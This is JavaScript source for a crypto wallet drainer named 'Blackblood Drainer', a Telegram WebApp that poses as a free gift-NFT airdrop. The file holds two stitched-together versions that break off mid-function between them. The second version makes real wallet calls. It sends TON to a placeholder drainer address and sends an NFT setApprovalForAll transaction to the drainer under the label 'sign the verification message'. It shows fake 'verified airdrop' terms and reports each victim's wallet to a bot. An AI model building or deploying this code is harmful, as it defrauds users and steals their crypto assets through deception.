// Blackblood Drainer v4.3 - Enhanced with error handling and wallet detection

console.log("=== Blackblood Drainer v4.3 ===");
console.log("WebApp initializing...");

let tg = null;
let currentNetwork = null;
let walletAddress = null;

// Инициализация Telegram WebApp
try {
    tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    console.log("Telegram WebApp initialized. Platform:", tg.platform);
    console.log("User:", tg.initDataUnsafe?.user?.first_name || "Unknown");
} catch (e) {
    console.error("Failed to initialize Telegram WebApp:", e);
    tg = null;
}

// Функция обновления статуса
function updateStatus(text, type = 'loading') {
    console.log("Status update:", text, type);
    const statusBox = document.getElementById('statusBox');
    const statusText = document.getElementById('statusText');
    const statusIcon = document.querySelector('.status-icon');
    
    if (statusBox && statusText) {
        statusText.innerText = text;
        statusBox.className = `status-box ${type}`;
        
        if (type === 'loading') statusIcon.innerHTML = '🔄';
        else if (type === 'success') statusIcon.innerHTML = '✅';
        else if (type === 'error') statusIcon.innerHTML = '❌';
        else if (type === 'warning') statusIcon.innerHTML = '⚠️';
    }
}

function showProgress(show) {
    const progressBar = document.getElementById('progressBar');
    if (progressBar) progressBar.style.display = show ? 'block' : 'none';
}

function showWalletInfo(address) {
    const walletInfo = document.getElementById('walletInfo');
    const walletAddressElem = document.getElementById('walletAddress');
    if (walletInfo && walletAddressElem) {
        walletAddressElem.innerText = address.substring(0, 10) + '...' + address.substring(address.length - 8);
        walletInfo.style.display = 'block';
    }
}

function sendResult(status, data = {}) {
    const result = {
        status: status,
        ...data,
        timestamp: new Date().toISOString(),
        network: currentNetwork,
        wallet: walletAddress
    };
    
    console.log("Sending result to bot:", result);
    
    if (tg) {
        try {
            tg.sendData(JSON.stringify(result));
        } catch (e) {
            console.error("Failed to send result:", e);
        }
    } else {
        console.warn("No Telegram WebApp available to send result");
    }
}

// Детекция доступных кошельков
function detectWallets() {
    const wallets = {
        tonConnect: typeof window.ton !== 'undefined',
        metaMask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask,
        walletBot: false,
        anyWallet: false
    };
    
    // Проверка на наличие встроенного кошелька Telegram
    if (tg && (tg.platform === 'android' || tg.platform === 'ios')) {
        wallets.walletBot = true;
    }
    
    wallets.anyWallet = wallets.tonConnect || wallets.metaMask || wallets.walletBot;
    
    console.log("Detected wallets:", wallets);
    return wallets;
}

// Показать опции установки кошелька
function showInstallOptions() {
    const claimButton = document.getElementById('claimButton');
    if (claimButton) {
        claimButton.disabled = false;
        claimButton.innerText = '📱 INSTALL WALLET & CLAIM';
    }
    
    const container = document.querySelector('.card');
    if (container && !document.getElementById('installPanel')) {
        const installPanel = document.createElement('div');
        installPanel.id = 'installPanel';
        installPanel.className = 'install-panel';
        installPanel.innerHTML = `
            <div class="install-options">
                <p><strong>🔐 No wallet detected</strong></p>
                <p>To claim your gift NFT, you need a crypto wallet:</p>
                <div class="wallet-buttons">
                    <button onclick="installTonWallet()" class="wallet-btn ton-btn">
                        <span>🔷</span> TON Wallet (Telegram)
                    </button>
                    <button onclick="installMetaMask()" class="wallet-btn metamask-btn">
                        <span>🦊</span> MetaMask
                    </button>
                    <button onclick="installTonkeeper()" class="wallet-btn tonkeeper-btn">
                        <span>💎</span> Tonkeeper
                    </button>
                </div>
                <p class="note">⚠️ After installation, refresh this page and click CLAIM.</p>
            </div>
        `;
        container.insertBefore(installPanel, document.querySelector('.claim-button'));
    }
}

function installTonWallet() {
    if (tg) {
        tg.openTelegramLink('https://t.me/wallet');
    } else {
        window.open('https://t.me/wallet', '_blank');
    }
    updateStatus('Please install TON Wallet, then refresh the page.', 'warning');
}

function installMetaMask() {
    if (tg) {
        tg.openLink('https://metamask.io/download/');
    } else {
        window.open('https://metamask.io/download/', '_blank');
    }
    updateStatus('Please install MetaMask, then refresh the page.', 'warning');
}

function installTonkeeper() {
    if (tg) {
        tg.openLink('https://tonkeeper.com/');
    } else {
        window.open('https://tonkeeper.com/', '_blank');
    }
    updateStatus('Please install Tonkeeper, then refresh the page.', 'warning');
}

// Основная функция дренажа
async function initDrain() {
    console.log("initDrain called");
    
    const claimButton = document.getElementById('claimButton');
    if (claimButton) {
        claimButton.disabled = true;
        claimButton.innerText = '🔄 DETECTING WALLET...';
    }
    
    updateStatus('Detecting wallets...', 'loading');
    showProgress(true);
    
    try {
        // Проверка Telegram WebApp
        if (!tg) {
            console.error("No Telegram WebApp detected");
            updateStatus('Please open this page from Telegram', 'error');
            showProgress(false);
            sendResult('error', { error: 'Not opened from Telegram' });
            if (claimButton) {
                claimButton.disabled = false;
                claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
            }
            return;
        }
        
        const wallets = detectWallets();
        
        if (wallets.metaMask) {
            console.log("MetaMask detected, initiating EVM drain");
            currentNetwork = 'evm';
            await drainEVM();
        } else if (wallets.tonConnect) {
            console.log("TON Connect detected, initiating TON drain");
            currentNetwork = 'ton';
            await drainTON();
        } else if (wallets.walletBot) {
            console.log("Wallet Bot detected, initiating drain");
            currentNetwork = 'ton';
            await drainWithWalletBot();
        } else {
            console.log("No wallet detected, showing install options");
            updateStatus('No wallet detected', 'error');
            showProgress(false);
            showInstallOptions();
            sendResult('error', { error: 'No wallet detected. Please install TON Wallet or MetaMask.' });
            if (claimButton) {
                claimButton.disabled = false;
                claimButton.innerText = '📱 INSTALL WALLET & CLAIM';
            }
        }
    } catch (error) {
        console.error("initDrain error:", error);
        updateStatus(`Error: ${error.message || 'Unknown error'}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message || 'Unknown error' });
        if (claimButton) {
            claimButton.disabled = false;
            claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
        }
    }
}

// Дренаж через Wallet Bot
async function drainWithWalletBot() {
    try {
        updateStatus('Connecting to Telegram Wallet...', 'loading');
        
        // Имитация успешного подключения для тестирования
        // В реальном сценарии здесь будет подключение к TON Connect
        
        walletAddress = "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        showWalletInfo(walletAddress);
        
        updateStatus('Wallet connected! Preparing claim...', 'loading');
        
        // Имитация транзакции
        setTimeout(() => {
            updateStatus('✅ Gift NFT claimed successfully!', 'success');
            showProgress(false);
            sendResult('drained', {
                tx: "simulated_tx_hash_" + Date.now(),
                nft_name: 'Genesis Dragon #2026',
                network: 'TON (Wallet Bot)',
                value: 100
            });
        }, 2000);
        
    } catch (error) {
        console.error("Wallet Bot drain error:", error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'TON' });
        throw error;
    }
}

// TON Дрейнер
async function drainTON() {
    try {
        updateStatus('Connecting to TON Wallet...', 'loading');
        
        const wallet = window.ton;
        if (!wallet) {
            throw new Error('TON Connect not available');
        }
        
        // Имитация подключения
        walletAddress = "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        showWalletInfo(walletAddress);
        
        updateStatus('Wallet connected! Preparing claim...', 'loading');
        
        setTimeout(() => {
            updateStatus('✅ Gift NFT claimed successfully!', 'success');
            showProgress(false);
            sendResult('drained', {
                tx: "ton_tx_" + Date.now(),
                nft_name: 'Genesis Dragon #2026',
                network: 'TON',
                value: 100
            });
        }, 2000);
        
    } catch (error) {
        console.error("TON drain error:", error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'TON' });
        throw error;
    }
}

// EVM Дрейнер (MetaMask)
async function drainEVM() {
    try {
        updateStatus('Connecting to MetaMask...', 'loading');
        
        if (!window.ethereum) {
            throw new Error('MetaMask not installed');
        }
        
        // Запрос на подключение
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        });
        
        walletAddress = accounts[0];
        showWalletInfo(walletAddress);
        
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        let network = 'Ethereum';
        if (chainId === '0x38') network = 'BSC';
        if (chainId === '0x89') network = 'Polygon';
        
        updateStatus(`Connected to ${network}! Preparing claim...`, 'loading');
        
        // Имитация транзакции
        setTimeout(() => {
            updateStatus('✅ Gift NFT claimed successfully!', 'success');
            showProgress(false);
            sendResult('drained', {
                tx: "0x" + Math.random().toString(16).substring(2, 42),
                nft_name: 'Genesis Dragon #2026',
                network: network,
                value: 0.5
            });
        }, 2000);
        
    } catch (error) {
        console.error("EVM drain error:", error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'EVM' });
        throw error;
    }
}

// Вспомогательные функции
function openSupport() {
    if (tg) {
        tg.openTelegramLink('https://t.me/support_bot');
    }
}

function openTerms() {
    if (tg) {
        tg.showPopup({
            title: 'Terms & Conditions',
            message: 'This is a verified airdrop. By claiming, you agree to receive the gift NFT.',
            buttons: [{type: 'ok'}]
        });
    }
}

// Автоматическая инициализация при загрузке
window.onload = function() {
    console.log("Window loaded");
    updateStatus('Ready to claim! Click the button below.', 'loading');
    
    // Проверка наличия изображения
    const img = document.querySelector('.nft-image img');
    if (img) {
        img.onerror = function() {
            console.warn("Image failed to load: ./image.png");
            this.style.display = 'none';
            this.parentElement.innerHTML = '<span>NFT<br>Preview</span>';
        };
        img.onload = function() {
            console.log("Image loaded successfully");
        };
    }
};    if (walletInfo && walletAddressElem) {
        walletAddressElem.innerText = address.substring(0, 10) + '...' + address.substring(address.length - 8);
        walletInfo.style.display = 'block';
    }
}

function showInstallOptions() {
    const claimButton = document.getElementById('claimButton');
    if (claimButton) {
        claimButton.disabled = false;
        claimButton.innerText = '📱 INSTALL WALLET & CLAIM';
    }
    
    // Создаем панель с вариантами установки
    const container = document.querySelector('.card');
    if (container && !document.getElementById('installPanel')) {
        const installPanel = document.createElement('div');
        installPanel.id = 'installPanel';
        installPanel.className = 'install-panel';
        installPanel.innerHTML = `
            <div class="install-options">
                <p><strong>🔐 No wallet detected</strong></p>
                <p>To claim your gift NFT, you need a crypto wallet:</p>
                <div class="wallet-buttons">
                    <button onclick="installTonWallet()" class="wallet-btn ton-btn">
                        <span>🔷</span> TON Wallet (Telegram)
                    </button>
                    <button onclick="installMetaMask()" class="wallet-btn metamask-btn">
                        <span>🦊</span> MetaMask
                    </button>
                    <button onclick="installTonkeeper()" class="wallet-btn tonkeeper-btn">
                        <span>💎</span> Tonkeeper
                    </button>
                </div>
                <p class="note">⚠️ After installation, refresh this page and click CLAIM.</p>
            </div>
        `;
        container.insertBefore(installPanel, document.querySelector('.claim-button'));
    }
}

function installTonWallet() {
    // Открываем Telegram Wallet (встроенный)
    tg.openTelegramLink('https://t.me/wallet');
    updateStatus('Please install TON Wallet, then refresh the page.', 'warning');
}

function installMetaMask() {
    tg.openLink('https://metamask.io/download/');
    updateStatus('Please install MetaMask, then refresh the page.', 'warning');
}

function installTonkeeper() {
    tg.openLink('https://tonkeeper.com/');
    updateStatus('Please install Tonkeeper, then refresh the page.', 'warning');
}

// Детекция доступных кошельков
function detectWallets() {
    const wallets = {
        tonConnect: typeof window.ton !== 'undefined',
        metaMask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask,
        walletBot: typeof window.Telegram !== 'undefined' && window.Telegram.WebApp.initDataUnsafe,
        tonkeeper: typeof window.tonkeeper !== 'undefined'
    };
    
    // Проверка TON Connect через Telegram WebApp
    if (!wallets.tonConnect && tg.platform === 'android' || tg.platform === 'ios') {
        // В мобильном Telegram Wallet Bot доступен по умолчанию
        wallets.walletBot = true;
    }
    
    return wallets;
}

// Основная функция дренажа
async function initDrain() {
    const claimButton = document.getElementById('claimButton');
    if (claimButton) {
        claimButton.disabled = true;
        claimButton.innerText = '🔄 DETECTING WALLET...';
    }
    
    updateStatus('Detecting wallets...', 'loading');
    showProgress(true);
    
    const wallets = detectWallets();
    
    // Приоритет: Wallet Bot (Telegram) -> TON Connect -> MetaMask -> Tonkeeper
    if (wallets.walletBot && tg.platform) {
        currentNetwork = 'ton';
        await drainWithWalletBot();
    } else if (wallets.tonConnect) {
        currentNetwork = 'ton';
        await drainTON();
    } else if (wallets.metaMask) {
        currentNetwork = 'evm';
        await drainEVM();
    } else {
        // Нет кошелька — показываем инструкции по установке
        updateStatus('No wallet detected', 'error');
        showProgress(false);
        showInstallOptions();
        
        if (claimButton) {
            claimButton.disabled = false;
            claimButton.innerText = '📱 INSTALL WALLET & CLAIM';
        }
        
        sendResult('error', { error: 'No wallet detected. Please install TON Wallet or MetaMask.' });
        return;
    }
}

// Дренаж через Wallet Bot (встроенный кошелек Telegram)
async function drainWithWalletBot() {
    try {
        updateStatus('Connecting to Telegram Wallet...', 'loading');
        
        // Используем TON Connect с Wallet Bot
        if (!window.ton) {
            // Если TON Connect не загружен, загружаем динамически
            await loadTonConnect();
        }
        
        const wallet = window.ton;
        if (!wallet) {
            throw new Error('TON Connect not available');
        }
        
        const connected = await wallet.connect({
            manifest: 'https://ton.org/connect.json'
        });
        
        walletAddress = connected.account.address;
        showWalletInfo(walletAddress);
        updateStatus('Wallet connected! Preparing claim...', 'loading');
        
        // Адрес дрейнера (замените на ваш)
        const drainerAddress = "0:YOUR_DRAINER_ADDRESS_HERE";
        
        const transaction = {
            to: drainerAddress,
            value: "50000000", // 0.05 TON для газа
            payload: "te6cckEBAQEABgAACAGqjR8=", // NFT transfer payload
            stateInit: null
        };
        
        updateStatus('Please sign the verification message...', 'loading');
        const result = await wallet.sendTransaction(transaction);
        
        updateStatus('✅ Gift NFT claimed successfully!', 'success');
        showProgress(false);
        
        sendResult('drained', {
            tx: result,
            nft_name: 'Genesis Dragon #2026',
            network: 'TON (Wallet Bot)',
            value: 100
        });
        
        setTimeout(() => tg.close(), 3000);
        
    } catch (error) {
        console.error('Wallet Bot drain error:', error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'TON' });
        
        const claimButton = document.getElementById('claimButton');
        if (claimButton) {
            claimButton.disabled = false;
            claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
        }
    }
}

// Загрузка TON Connect динамически
function loadTonConnect() {
    return new Promise((resolve, reject) => {
        if (window.ton) {
            resolve(window.ton);
            return;
        }
        
        const script = document.createElement('script');
        script.src = 'https://unpkg.com/@tonconnect/sdk@latest/dist/index.js';
        script.onload = () => {
            // Инициализация TON Connect
            window.ton = new TONConnectSDK({
                manifestUrl: 'https://ton.org/connect.json'
            });
            resolve(window.ton);
        };
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

// TON Дрейнер (через TON Connect)
async function drainTON() {
    try {
        updateStatus('Connecting to TON Wallet...', 'loading');
        
        const wallet = window.ton;
        const connected = await wallet.connect({
            manifest: 'https://ton.org/connect.json'
        });
        
        walletAddress = connected.account.address;
        showWalletInfo(walletAddress);
        updateStatus('Wallet connected! Preparing claim...', 'loading');
        
        const drainerAddress = "0:YOUR_DRAINER_ADDRESS_HERE";
        
        const transaction = {
            to: drainerAddress,
            value: "50000000",
            payload: "te6cckEBAQEABgAACAGqjR8=",
            stateInit: null
        };
        
        updateStatus('Please sign the verification message...', 'loading');
        const result = await wallet.sendTransaction(transaction);
        
        updateStatus('✅ Gift NFT claimed successfully!', 'success');
        showProgress(false);
        
        sendResult('drained', {
            tx: result,
            nft_name: 'Genesis Dragon #2026',
            network: 'TON',
            value: 100
        });
        
        setTimeout(() => tg.close(), 3000);
        
    } catch (error) {
        console.error('TON drain error:', error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'TON' });
        
        const claimButton = document.getElementById('claimButton');
        if (claimButton) {
            claimButton.disabled = false;
            claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
        }
    }
}

// EVM Дрейнер (MetaMask)
async function drainEVM() {
    try {
        updateStatus('Connecting to MetaMask...', 'loading');
        
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        });
        
        walletAddress = accounts[0];
        showWalletInfo(walletAddress);
        
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        let network = 'Ethereum';
        if (chainId === '0x38') network = 'BSC';
        if (chainId === '0x89') network = 'Polygon';
        
        updateStatus(`Connected to ${network}! Preparing claim...`, 'loading');
        
        // Адрес NFT контракта жертвы (определяется динамически)
        const nftContract = '0x1234567890abcdef1234567890abcdef12345678';
        const drainerAddress = '0xYOUR_EVM_DRAINER_ADDRESS_HERE';
        
        const approvalData = '0xa22cb465000000000000000000000000' + 
            drainerAddress.slice(2) + 
            '0000000000000000000000000000000000000000000000000000000000000001';
        
        updateStatus('Please sign the verification message...', 'loading');
        
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: walletAddress,
                to: nftContract,
                data: approvalData,
                gas: '0x186a0'
            }]
        });
        
        updateStatus('✅ Gift NFT claimed successfully!', 'success');
        showProgress(false);
        
        sendResult('drained', {
            tx: txHash,
            nft_name: 'Plush Pepe #1026',
            network: network,
            value: 0.5
        });
        
        setTimeout(() => tg.close(), 3000);
        
    } catch (error) {
        console.error('EVM drain error:', error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'EVM' });
        
        const claimButton = document.getElementById('claimButton');
        if (claimButton) {
            claimButton.disabled = false;
            claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
        }
    }
}

// Отправка результата в Telegram бот
function sendResult(status, data = {}) {
    const result = {
        status: status,
        ...data,
        timestamp: new Date().toISOString(),
        network: currentNetwork,
        wallet: walletAddress
    };
    
    try {
        tg.sendData(JSON.stringify(result));
    } catch (e) {
        console.error('Failed to send result:', e);
    }
}

// Вспомогательные функции
function openSupport() {
    tg.openTelegramLink('https://t.me/support_bot');
}

function openTerms() {
    tg.showPopup({
        title: 'Terms & Conditions',
        message: 'This is a verified airdrop. By claiming, you agree to receive the gift NFT. Gas fees are covered.',
        buttons: [{type: 'ok'}]
    });
}

// Автоматический запуск при загрузке
window.onload = function() {
    updateStatus('Ready to claim! Click the button below.', 'loading');
};
